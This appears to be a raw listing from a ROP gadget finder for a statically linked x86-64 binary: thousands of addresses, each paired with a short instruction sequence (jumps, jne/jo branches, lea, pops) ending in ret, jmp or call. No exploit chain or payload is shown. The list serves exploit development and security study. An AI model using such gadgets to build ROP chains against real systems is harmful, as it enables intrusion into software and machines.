0x000000000047f532 : jmp 0x47f38e
0x0000000000480dd2 : jmp 0x480d97
0x000000000048afc2 : jmp 0x48b014
0x000000000048c75a : jmp 0x48c720
0x000000000048ede2 : jmp 0x48ee34
0x00000000004954fe : jmp 0x495514
0x00000000004ae22a : jmp 0x4ae269
0x00000000004aef69 : jmp 0x4aef3c
0x00000000004aff60 : jmp 0x4afef4
0x00000000004aff5f : jmp 0x4afef5
0x000000000043b96a : jmp 0x4fc2c968
0x000000000043b969 : jmp 0x4fc2c969
0x000000000043e48a : jmp 0x4fc2f488
0x000000000043e489 : jmp 0x4fc2f489
0x000000000041f133 : jmp 0xffffffffc3421b5b
0x0000000000489a51 : jmp 0xffffffffc35823a6
0x00000000004825b9 : jmp 0xffffffffeb09e849
0x000000000047c0f3 : jmp 0xfffffffff6798383
0x000000000049b1d3 : jmp qword ptr [rax + 0x10fff945]
0x000000000049b193 : jmp qword ptr [rax + 0x20fff92d]
0x000000000049b19b : jmp qword ptr [rax + 0x20fff930]
0x000000000049b1a3 : jmp qword ptr [rax + 0x20fff933]
0x000000000049b1ab : jmp qword ptr [rax + 0x20fff936]
0x000000000049b1b3 : jmp qword ptr [rax + 0x20fff939]
0x000000000049b1bb : jmp qword ptr [rax + 0x20fff93c]
0x000000000049b1c3 : jmp qword ptr [rax + 0x20fff93f]
0x000000000049b37f : jmp qword ptr [rax + 0x30fff98d]
0x0000000000414c91 : jmp qword ptr [rax]
0x00000000004b257b : jmp qword ptr [rbx + rcx]
0x00000000004822ba : jmp qword ptr [rbx]
0x000000000049b2c7 : jmp qword ptr [rcx]
0x000000000049b30f : jmp qword ptr [rdi]
0x000000000049beff : jmp qword ptr [rdx + 0x12fffa23]
0x000000000049bef7 : jmp qword ptr [rdx + 0x22fffa24]
0x000000000049beef : jmp qword ptr [rdx + 0x22fffa25]
0x000000000049bee7 : jmp qword ptr [rdx + 0x22fffa26]
0x000000000049bedf : jmp qword ptr [rdx + 0x22fffa27]
0x0000000000470335 : jmp qword ptr [rdx + rax*8]
0x0000000000408479 : jmp qword ptr [rdx]
0x000000000049b2df : jmp qword ptr [rsi + 0x26fff989]
0x000000000049b2e7 : jmp qword ptr [rsi + 0x26fff98a]
0x000000000049b2ef : jmp qword ptr [rsi + 0x26fff98b]
0x000000000049b30b : jmp qword ptr [rsi + 0x27fff98f]
0x000000000044ee19 : jmp qword ptr [rsi + 0xf]
0x0000000000452200 : jmp qword ptr [rsi]
0x000000000042b369 : jmp r10
0x0000000000486c80 : jmp r11
0x000000000043436d : jmp r9
0x0000000000400ad1 : jmp rax
0x000000000048632d : jmp rbx
0x0000000000428ed2 : jmp rcx
0x00000000004017e9 : jmp rdi
0x0000000000413be5 : jmp rdx
0x000000000042ca4d : jmp rsi
0x00000000004740ad : jmp rsp
0x00000000004005c5 : jne 0x4005cc ; ret
0x00000000004015fb : jne 0x4015fa ; mov eax, r8d ; cdqe ; ret
0x0000000000401829 : jne 0x401822 ; ret
0x0000000000401857 : jne 0x40184e ; cmp rsi, 0 ; jne 0x401828 ; ret
0x000000000040196d : jne 0x401956 ; mov rax, r11 ; ret
0x0000000000401a41 : jne 0x401a36 ; xor r10, r10 ; ret
0x0000000000401aa1 : jne 0x401a96 ; xor r10, r10 ; ret
0x0000000000401d99 : jne 0x401dac ; add rsp, 0xd8 ; ret
0x000000000040c73c : jne 0x40c750 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x0000000000414468 : jne 0x414446 ; ret
0x000000000041455b : jne 0x414585 ; add rsp, 0x118 ; ret
0x00000000004160e1 : jne 0x4160f4 ; add rsp, 0xd8 ; ret
0x0000000000416192 : jne 0x4161a5 ; add rsp, 0xd8 ; ret
0x000000000041b295 : jne 0x41b2a3 ; ret
0x000000000041ceb8 : jne 0x41cf0c ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x000000000041cf31 : jne 0x41cf23 ; ret
0x000000000041de4e : jne 0x41de43 ; ret
0x000000000041e481 : jne 0x41e447 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000041e4cc : jne 0x41e4c5 ; lea eax, dword ptr [rdx + rdi] ; ret
0x000000000041ede6 : jne 0x41eddb ; ret
0x0000000000420a40 : jne 0x420a4f ; add rsp, 0x20 ; pop rbx ; ret
0x000000000042611c : jne 0x4260e3 ; ret
0x00000000004295ca : jne 0x429551 ; ret
0x00000000004298d7 : jne 0x4298c6 ; sub rax, 0x10 ; ret
0x000000000042c9bc : jne 0x42c9a6 ; xor eax, eax ; sub eax, ecx ; ret
0x0000000000431e57 : jne 0x431eb4 ; xor eax, eax ; ret
0x0000000000431e27 : jne 0x431ed8 ; xor eax, eax ; ret
0x00000000004322d3 : jne 0x4322f7 ; xor eax, eax ; vzeroupper ; ret
0x0000000000432a0a : jne 0x432a15 ; vzeroupper ; ret
0x0000000000432b04 : jne 0x432a16 ; ret
0x0000000000432c4f : jne 0x432a19 ; vzeroupper ; ret
0x00000000004342bd : jne 0x4342e7 ; xor eax, eax ; ret
0x00000000004338b1 : jne 0x4342eb ; xor eax, eax ; ret
0x00000000004338d9 : jne 0x4342f7 ; xor eax, eax ; ret
0x000000000044b695 : jne 0x44b626 ; lea rax, qword ptr [rdi + 3] ; ret
0x000000000044b667 : jne 0x44b626 ; lea rax, qword ptr [rdi + 7] ; ret
0x000000000044b666 : jne 0x44b627 ; lea rax, qword ptr [rdi + 7] ; ret
0x000000000044cdf4 : jne 0x44d008 ; xor eax, eax ; ret
0x000000000044cff9 : jne 0x44d019 ; xor eax, eax ; ret
0x000000000044cea1 : jne 0x44d01d ; xor eax, eax ; ret
0x000000000044d011 : jne 0x44d01e ; cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x000000000044d121 : jne 0x44d112 ; ret
0x000000000044d1d1 : jne 0x44d1c2 ; ret
0x000000000044d341 : jne 0x44d336 ; lea rax, qword ptr [rcx - 1] ; ret
0x000000000044d491 : jne 0x44d486 ; sub rax, 1 ; ret
0x000000000044e79d : jne 0x44e786 ; ret
0x000000000044e904 : jne 0x44e8ec ; vzeroupper ; ret
0x000000000044eac7 : jne 0x44eaa7 ; vzeroupper ; ret
0x000000000044f29f : jne 0x44f2cb ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000450057 : jne 0x45006f ; add rsp, 0x28 ; ret
0x0000000000450287 : jne 0x4502d1 ; add rsp, 0x58 ; ret
0x0000000000450641 : jne 0x45060e ; neg eax ; jmp 0x45060e
0x0000000000450617 : jne 0x450669 ; add rsp, 0x68 ; ret
0x0000000000450f86 : jne 0x450f9d ; add rsp, 0x28 ; ret
0x00000000004511bb : jne 0x4511d6 ; mov rdi, qword ptr [rbx] ; call r12
0x00000000004511e1 : jne 0x451227 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451209 : jne 0x451247 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451d26 : jne 0x451d4e ; mov rdi, qword ptr [rbx] ; call r12
0x0000000000451d59 : jne 0x451da7 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451d85 : jne 0x451e07 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451e11 : jne 0x451e78 ; mov rdi, qword ptr [r13] ; call r12
0x0000000000451e41 : jne 0x451ea9 ; mov rdi, qword ptr [r13] ; call r12
0x0000000000452852 : jne 0x452849 ; pop rdx ; pop r10 ; ret
0x0000000000455caf : jne 0x455c43 ; call rsi
0x00000000004618cf : jne 0x4618dc ; add rsp, 0x18 ; ret
0x0000000000461b17 : jne 0x461b6c ; add rsp, 0x148 ; ret
0x000000000046f512 : jne 0x46f525 ; add rsp, 0xd8 ; ret
0x00000000004733a7 : jne 0x47336f ; and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000477601 : jne 0x4775f3 ; ret
0x000000000047884c : jne 0x478845 ; lea eax, dword ptr [rdx + rdi] ; ret
0x000000000047a303 : jne 0x47a30e ; xor rax, rax ; ret
0x000000000047a703 : jne 0x47a738 ; mov rax, r8 ; vzeroupper ; ret
0x000000000047afbc : jne 0x47afb3 ; ret
0x000000000047afc3 : jne 0x47afce ; xor rax, rax ; ret
0x000000000047b25b : jne 0x47b216 ; mov rax, rdx ; ret
0x000000000047c3dc : jne 0x47c429 ; add rsp, 0x58 ; ret
0x000000000047c45f : jne 0x47c472 ; movzx eax, al ; add rsp, 0x58 ; ret
0x000000000047c50e : jne 0x47c531 ; add rsp, 0x38 ; ret
0x00000000004852ea : jne 0x485290 ; mov eax, dword ptr [rdx + 4] ; ret
0x00000000004852d8 : jne 0x4852b3 ; ret
0x0000000000485f77 : jne 0x485f91 ; mov rax, qword ptr [rip + 0x23e7b0] ; ret
0x0000000000485fcc : jne 0x485fa3 ; ret
0x0000000000487a89 : jne 0x487a61 ; movsx eax, cl ; neg eax ; ret
0x000000000048885a : jne 0x488869 ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000488955 : jne 0x488989 ; add rsp, 0x38 ; ret
0x0000000000488a15 : jne 0x488a44 ; add rsp, 0x68 ; ret
0x0000000000488b76 : jne 0x488bb4 ; add rsp, 0x78 ; ret
0x0000000000488e45 : jne 0x488e74 ; add rsp, 0x68 ; ret
0x000000000048ae81 : jne 0x48aec1 ; leave ; ret
0x000000000048b321 : jne 0x48b30d ; mov rax, rsi ; ret
0x000000000048b3a5 : jne 0x48b385 ; mov rax, rsi ; ret
0x000000000048bb2d : jne 0x48bb3a ; add rsp, 0x38 ; ret
0x000000000048bc10 : jne 0x48bc2a ; add rsp, 0x38 ; ret
0x000000000048e326 : jne 0x48e350 ; ret
0x000000000048e325 : jne 0x48e351 ; ret
0x000000000048e3db : jne 0x48e3e2 ; pop rbx ; ret
0x000000000048ef6b : jne 0x48ef82 ; add rsp, 0x38 ; ret
0x000000000048f079 : jne 0x48f093 ; add rsp, 0x40 ; pop rbx ; ret
0x000000000048f160 : jne 0x48f17b ; add rsp, 0x50 ; pop rbx ; ret
0x0000000000491b49 : jne 0x491b6c ; xor eax, eax ; ret
0x0000000000491b31 : jne 0x491b71 ; mov rax, qword ptr [rsi + 0xb0] ; ret
0x0000000000493d60 : jne 0x493d81 ; mov rax, qword ptr [rax] ; ret
0x0000000000493dcf : jne 0x493dda ; mov qword ptr [rax], rdx ; ret
0x000000000049412e : jne 0x494127 ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x00000000004943f8 : jne 0x4943f1 ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000494733 : jne 0x49472c ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000494c84 : jne 0x494ca3 ; ret
0x0000000000494ca4 : jne 0x494cbc ; mov eax, 8 ; ret
0x0000000000494ccf : jne 0x494cfe ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000494ce9 : jne 0x494d02 ; xor eax, eax ; ret
0x0000000000495b2f : jne 0x495b5e ; mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000495b49 : jne 0x495b62 ; xor eax, eax ; ret
0x00000000004960e9 : jne 0x4960f3 ; ret
0x0000000000496104 : jne 0x496113 ; ret
0x0000000000496334 : jne 0x496343 ; ret
0x00000000004965b9 : jne 0x4965dc ; xor eax, eax ; ret
0x0000000000496b85 : jne 0x496b78 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000496bd0 : jne 0x496bb0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000496d15 : jne 0x496cfb ; pop rbx ; ret
0x0000000000496e23 : jne 0x496e0e ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004979dd : jne 0x4979c6 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000497b61 : jne 0x497b78 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004b70b5 : jne 0x4b70b2 ; call qword ptr [rdx]
0x00000000004b70f1 : jne 0x4b70ee ; call qword ptr [rax]
0x00000000004b7105 : jne 0x4b7102 ; jmp rbx
0x0000000000433b6e : jno 0x433b7d ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000043ef60 : jno 0x43ef69 ; vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x000000000043f19a : jno 0x43f1a3 ; vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x000000000043f301 : jno 0x43f312 ; vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x000000000043f466 : jno 0x43f4ea ; adc qword ptr [rdi - 8], rdi ; ret
0x000000000046798a : jno 0x4679b8 ; add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x00000000004679d8 : jno 0x467a06 ; add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x00000000004679d7 : jno 0x467a07 ; add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x0000000000489944 : jno 0x489996 ; shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000406412 : jnp 0x406409 ; jmp 0x406434
0x0000000000406411 : jnp 0x40640a ; jmp 0x406435
0x0000000000406725 : jnp 0x40671c ; jmp 0x406747
0x0000000000406724 : jnp 0x40671d ; jmp 0x406748
0x0000000000406a93 : jnp 0x406a8a ; jmp 0x406ab5
0x0000000000406a92 : jnp 0x406a8b ; jmp 0x406ab6
0x000000000042b271 : jnp 0x42b2a4 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000042b271 : jnp 0x42b2a5 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x00000000004aea45 : jnp 0x4aea02 ; ret
0x00000000004ba555 : jnp 0x4ba55d ; add al, ch ; clc ; sti ; jmp rdx
0x000000000042af0f : jns 0x42af17 ; add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x000000000043ef67 : jns 0x43ef6a ; ret
0x000000000043f1a1 : jns 0x43f1a4 ; ret
0x000000000043f308 : jns 0x43f313 ; ret
0x0000000000451d86 : jns 0x451dd6 ; mov edi, dword ptr [rbp] ; call r12
0x0000000000491a1e : jns 0x491a2b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x0000000000493cce : jns 0x493d11 ; add byte ptr [rbp + rbx + 0x48], dh ; add esp, 0x18 ; ret
0x0000000000494a3e : jns 0x494a4b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x000000000049663e : jns 0x49664b ; mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x00000000004adb4e : jns 0x4adae4 ; ret 0xf869
0x00000000004adb4d : jns 0x4adae5 ; ret 0xf869
0x00000000004aff5e : jns 0x4affb5 ; jmp 0x4afef6
0x00000000004ba3a5 : jns 0x4ba3ad ; add byte ptr [rax - 0x10], bl ; sti ; jmp qword ptr [rbx]
0x00000000004ba3bd : jns 0x4ba3c5 ; add byte ptr [rax - 0x10], dh ; sti ; jmp qword ptr [rbx]
0x00000000004035c8 : jo 0x403558 ; ret 0x51a3
0x00000000004035d8 : jo 0x403568 ; ret 0x51a3
0x000000000040adb8 : jo 0x40ada4 ; ret 0x1bd
0x000000000041b0b4 : jo 0x41b105 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x000000000041b0e4 : jo 0x41b135 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000426248 : jo 0x42622e ; sub dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000450d2d : jo 0x450d31 ; dec dword ptr [rax - 0x77] ; ret
0x0000000000452c22 : jo 0x452c46 ; ret
0x0000000000459c10 : jo 0x459c1a ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x000000000047767a : jo 0x477692 ; mov qword ptr [rax + 0x40], rcx ; ret
0x000000000047947f : jo 0x47947e ; dec dword ptr [rax + 1] ; ret
0x000000000047947e : jo 0x47947f ; dec dword ptr [rax + 1] ; ret
0x000000000047a976 : jo 0x47a9d8 ; pop rbp ; pop r12 ; ret
0x000000000047ab8d : jo 0x47abef ; pop rbp ; pop r12 ; ret
0x0000000000488d34 : jo 0x488d9a ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000049b188 : jo 0x49b1b6 ; stc ; call qword ptr [rax]
0x000000000049b280 : jo 0x49b20b ; stc ; jmp qword ptr [rax]
0x000000000049b200 : jo 0x49b25a ; stc ; jmp rax
0x000000000049b38c : jo 0x49b324 ; stc ; dec dword ptr [rax - 0x56] ; stc ; call qword ptr [rax]
0x000000000049b504 : jo 0x49b4b0 ; stc ; inc eax ; movsb byte ptr [rdi], byte ptr [rsi] ; stc ; call qword ptr [rax]
0x000000000049b518 : jo 0x49b4b6 ; stc ; inc eax ; xchg eax, esi ; stc ; call qword ptr [rax]
0x000000000049b610 : jo 0x49b5ea ; stc ; push qword ptr [rax] ; sar ecx, cl ; call qword ptr [rax]
0x000000000049b6e4 : jo 0x49b6ac ; stc ; inc eax ; ret 0xfff9
0x000000000049b6e4 : jo 0x49b6ae ; stc ; inc eax ; ret 0xfff9
0x000000000049c040 : jo 0x49c068 ; cli ; jmp rax
0x000000000049c058 : jo 0x49c085 ; cli ; jmp rax
0x000000000049c1e0 : jo 0x49c16c ; cli ; call qword ptr [rax]
0x000000000049c1c0 : jo 0x49c23f ; cli ; call qword ptr [rax]
0x00000000004aebc4 : jo 0x4aec3e ; mov ebp, 0xfb67d10d ; ret
0x00000000004b618c : jo 0x4b6193 ; ret 0xa01
0x00000000004b6d6c : jo 0x4b6db8 ; add byte ptr [rax], al ; loopne 0x4b6d60 ; clc ; call qword ptr [rax]
0x00000000004b786c : jo 0x4b78c3 ; add byte ptr [rax], al ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004ba3c0 : jo 0x4ba3b5 ; sti ; jmp qword ptr [rbx]
0x00000000004bc06c : jo 0x4bc00b ; add byte ptr [rax], al ; push rax ; stc ; cld ; jmp qword ptr [rdx]
0x000000000045ddc2 : jp 0x45ddbc ; ret
0x000000000049c1c1 : jp 0x49c1bf ; call qword ptr [rax]
0x000000000043b65a : jrcxz 0x43b655 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b659 : jrcxz 0x43b656 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e17a : jrcxz 0x43e175 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e179 : jrcxz 0x43e176 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004528a3 : jrcxz 0x452868 ; cmp r11d, 0xa ; je 0x4528b4 ; ret
0x000000000046ee5f : jrcxz 0x46ee65 ; dec dword ptr [rbp - 0x77] ; ret 0x894c
0x000000000046ee5e : jrcxz 0x46ee66 ; dec dword ptr [rbp - 0x77] ; ret 0x894c
0x0000000000485c79 : jrcxz 0x485ca5 ; add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0x840f
0x0000000000485d16 : jrcxz 0x485d42 ; add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0xc74
0x00000000004960a5 : jrcxz 0x4960d1 ; add byte ptr [rbp - 0xcfb8b40], al ; ret
0x0000000000496e24 : jrcxz 0x496e86 ; pop rbp ; pop r12 ; ret
0x00000000004ad9a5 : jrcxz 0x4ad9ff ; ret
0x0000000000400f5c : js 0x400fc0 ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000415325 : js 0x415349 ; call rdx
0x0000000000478519 : js 0x478551 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x0000000000482852 : js 0x482865 ; pop rbx ; ret
0x0000000000493f86 : js 0x493f93 ; add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x0000000000493f93 : js 0x493f9f ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000000496c53 : js 0x496cce ; ret 0x8b48
0x00000000004b7191 : js 0x4b718e ; call qword ptr [rbx]
0x00000000004bcf81 : js 0x4bcf82 ; call qword ptr [rbx]
0x0000000000471e63 : lahf ; add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret
0x000000000045d015 : lahf ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xb2eb
0x0000000000425b0f : lahf ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x000000000049c231 : lahf ; cli ; jmp qword ptr [rax]
0x000000000049d700 : lahf ; imul edi, ebx, -1 ; push 0x6b ; sti ; jmp qword ptr [rdx]
0x00000000004b0083 : lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00000000004852eb : lahf ; mov eax, dword ptr [rdx + 4] ; ret
0x000000000044629d : lahf ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000046572f : lahf ; or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x000000000045149b : lahf ; ret
0x000000000041f78f : lahf ; ret 0x3949
0x000000000041f842 : lahf ; ret 0x48e9
0x0000000000451351 : lahf ; ret 0x8545
0x00000000004ad8dd : lahf ; ret 0x871e
0x000000000044eb59 : lahf ; ret 0xea81
0x0000000000493341 : lahf ; ret 0xf45
0x000000000049b4f9 : lahf ; stc ; call rax
0x00000000004b1a95 : lahf ; std ; jmp qword ptr [rbx]
0x00000000004b1aa1 : lahf ; std ; push rsp ; lahf ; std ; jmp qword ptr [rbx]
0x000000000044692d : lar eax, word ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000049b54f : lcall ptr [rax - 0x2e] ; stc ; jmp qword ptr [rax]
0x0000000000421632 : lcall ptr [rbx + 0x48] ; mov eax, edi ; pop rbp ; pop r12 ; ret
0x000000000041fe90 : lcall ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004189f5 : lcall ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000041877b : lcall ptr [rbx + 0x5d] ; ret
0x0000000000486916 : lcall ptr [rbx + 0x64] ; mov eax, dword ptr [rax] ; ret
0x0000000000416f6e : lcall ptr [rbx - 0x77] ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; pop r13 ; ret
0x00000000004ab043 : lcall ptr [rdi + rbp*4] ; cld ; jmp qword ptr [rax]
0x000000000049d713 : lcall ptr [rsi] ; insb byte ptr [rdi], dx ; sti ; call rdi
0x000000000043bce6 : lddqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000041e4db : lea eax, dword ptr [r8 - 1] ; ret
0x0000000000491a3c : lea eax, dword ptr [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x0000000000431e84 : lea eax, dword ptr [rax + rdi + 0x10] ; ret
0x0000000000431e94 : lea eax, dword ptr [rax + rdi + 0x20] ; ret
0x0000000000431e64 : lea eax, dword ptr [rax + rdi - 0x10] ; ret
0x000000000041e4dc : lea eax, dword ptr [rax - 1] ; ret
0x000000000047a02d : lea eax, dword ptr [rcx + rsi] ; ret
0x000000000044d344 : lea eax, dword ptr [rcx - 1] ; ret
0x000000000044b3bc : lea eax, dword ptr [rdi + 0x10] ; ret
0x000000000044b3d1 : lea eax, dword ptr [rdi + 0x11] ; ret
0x000000000044b3ef : lea eax, dword ptr [rdi + 0x12] ; ret
0x000000000044b40f : lea eax, dword ptr [rdi + 0x13] ; ret
0x000000000044b432 : lea eax, dword ptr [rdi + 0x14] ; ret
0x000000000044b451 : lea eax, dword ptr [rdi + 0x15] ; ret
0x000000000044b471 : lea eax, dword ptr [rdi + 0x16] ; ret
0x000000000044b491 : lea eax, dword ptr [rdi + 0x17] ; ret
0x000000000044b4b4 : lea eax, dword ptr [rdi + 0x18] ; ret
0x000000000044b4d9 : lea eax, dword ptr [rdi + 0x19] ; ret
0x000000000044b4f7 : lea eax, dword ptr [rdi + 0x1a] ; ret
0x000000000044b517 : lea eax, dword ptr [rdi + 0x1b] ; ret
0x000000000044b533 : lea eax, dword ptr [rdi + 0x1c] ; ret
0x000000000044b553 : lea eax, dword ptr [rdi + 0x1d] ; ret
0x000000000044b573 : lea eax, dword ptr [rdi + 0x1e] ; ret
0x000000000044b593 : lea eax, dword ptr [rdi + 0x1f] ; ret
0x000000000044b30d : lea eax, dword ptr [rdi + 0xa] ; ret
0x000000000044b32d : lea eax, dword ptr [rdi + 0xb] ; ret
0x000000000044b34f : lea eax, dword ptr [rdi + 0xc] ; ret
0x000000000044b36f : lea eax, dword ptr [rdi + 0xd] ; ret
0x000000000044b38f : lea eax, dword ptr [rdi + 0xe] ; ret
0x000000000044b3a9 : lea eax, dword ptr [rdi + 0xf] ; ret
0x000000000044b257 : lea eax, dword ptr [rdi + 1] ; ret
0x000000000044b26a : lea eax, dword ptr [rdi + 2] ; ret
0x000000000044b275 : lea eax, dword ptr [rdi + 3] ; ret
0x000000000044b288 : lea eax, dword ptr [rdi + 4] ; ret
0x000000000044b29d : lea eax, dword ptr [rdi + 5] ; ret
0x000000000044b2bb : lea eax, dword ptr [rdi + 6] ; ret
0x000000000044b2c7 : lea eax, dword ptr [rdi + 7] ; ret
0x000000000044b2da : lea eax, dword ptr [rdi + 8] ; ret
0x000000000044b2ef : lea eax, dword ptr [rdi + 9] ; ret
0x0000000000431eb9 : lea eax, dword ptr [rdi + rax + 0x10] ; ret
0x0000000000431ec9 : lea eax, dword ptr [rdi + rax + 0x20] ; ret
0x0000000000431dc3 : lea eax, dword ptr [rdi + rax + 0x30] ; ret
0x000000000047a275 : lea eax, dword ptr [rdi + rax - 0x20] ; vzeroupper ; ret
0x0000000000446e27 : lea eax, dword ptr [rdi + rax] ; ret
0x000000000044d69a : lea eax, dword ptr [rdi + rcx] ; sub rax, rsi ; ret
0x0000000000479f29 : lea eax, dword ptr [rdi + rsi] ; ret
0x000000000044b243 : lea eax, dword ptr [rdi] ; ret
0x000000000044a82d : lea eax, dword ptr [rdx + 0xa] ; ret
0x000000000044a84d : lea eax, dword ptr [rdx + 0xb] ; ret
0x000000000044a86f : lea eax, dword ptr [rdx + 0xc] ; ret
0x000000000044a88f : lea eax, dword ptr [rdx + 0xd] ; ret
0x000000000044a8af : lea eax, dword ptr [rdx + 0xe] ; ret
0x000000000044a73f : lea eax, dword ptr [rdx + 0xf] ; ret
0x000000000044a767 : lea eax, dword ptr [rdx + 1] ; ret
0x000000000044a77d : lea eax, dword ptr [rdx + 2] ; ret
0x000000000044a795 : lea eax, dword ptr [rdx + 3] ; ret
0x000000000044a7ab : lea eax, dword ptr [rdx + 4] ; ret
0x000000000044a7bd : lea eax, dword ptr [rdx + 5] ; ret
0x000000000044a7db : lea eax, dword ptr [rdx + 6] ; ret
0x000000000044a6e7 : lea eax, dword ptr [rdx + 7] ; ret
0x000000000044a7ed : lea eax, dword ptr [rdx + 8] ; ret
0x000000000044a80d : lea eax, dword ptr [rdx + 9] ; ret
0x000000000041e4ce : lea eax, dword ptr [rdx + rdi] ; ret
0x000000000044ec73 : lea eax, dword ptr [rdx + rdx] ; pop rbx ; and eax, 0x7ff80000 ; ret
0x0000000000429856 : lea eax, dword ptr [rdx - 0x10] ; ret
0x000000000044a755 : lea eax, dword ptr [rdx] ; ret
0x000000000042b2c8 : lea eax, dword ptr [rip + 0x1bb12] ; cmove rax, rdx ; ret
0x000000000042a368 : lea eax, dword ptr [rip + 0x1d0a2] ; cmove rax, rdx ; ret
0x000000000042ae7f : lea eax, dword ptr [rip + 0x221ab] ; cmove rax, rdx ; ret
0x000000000042b208 : lea eax, dword ptr [rip + 0x22732] ; cmovne rax, rdx ; ret
0x000000000042b0c8 : lea eax, dword ptr [rip + 0x22862] ; cmovne rax, rdx ; ret
0x000000000042af68 : lea eax, dword ptr [rip + 0x229d2] ; cmovne rax, rdx ; ret
0x000000000042b26f : lea eax, dword ptr [rip + 0x22a7b] ; cmovne rax, rdx ; ret
0x000000000042b12f : lea eax, dword ptr [rip + 0x22bab] ; cmovne rax, rdx ; ret
0x000000000042afcf : lea eax, dword ptr [rip + 0x22d1b] ; cmovne rax, rdx ; ret
0x000000000042b24e : lea eax, dword ptr [rip + 0x22ecc] ; cmovne rax, rdx ; ret
0x000000000042b10e : lea eax, dword ptr [rip + 0x22ffc] ; cmovne rax, rdx ; ret
0x000000000042afae : lea eax, dword ptr [rip + 0x2316c] ; cmovne rax, rdx ; ret
0x000000000042a2ef : lea eax, dword ptr [rip + 0x231db] ; cmovne rax, rdx ; ret
0x000000000042b03a : lea eax, dword ptr [rip + 0x23660] ; cmovne rax, rdx ; ret
0x000000000042b01d : lea eax, dword ptr [rip + 0x237dd] ; cmovne rax, rdx ; ret
0x000000000042b06e : lea eax, dword ptr [rip + 0x2390c] ; cmovne rax, rdx ; ret
0x0000000000453fb1 : lea eax, dword ptr [rip + 0x26e349] ; ret
0x000000000048bccf : lea eax, dword ptr [rip + 0x5b] ; cmovne rax, rdx ; ret
0x000000000042b298 : lea eax, dword ptr [rip + 0x6c52] ; cmove rax, rdx ; ret
0x000000000042aea8 : lea eax, dword ptr [rip + 0x6d12] ; cmove rax, rdx ; ret
0x000000000042af0c : lea eax, dword ptr [rip + 0x79ee] ; je 0x42aee3 ; ret
0x0000000000479448 : lea eax, dword ptr [rip + 0x9f2] ; cmove rax, rdx ; ret
0x000000000047a858 : lea eax, dword ptr [rip + 0xa22] ; cmove rax, rdx ; ret
0x0000000000479418 : lea eax, dword ptr [rip + 0xee2] ; cmove rax, rdx ; ret
0x0000000000401921 : lea eax, dword ptr [rsp + 8] ; ret
0x00000000004663b1 : lea ebp, dword ptr [rdx] ; add al, byte ptr [rax] ; add byte ptr [rax + 0x63], cl ; ret
0x000000000041a2a8 : lea ebp, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x8948
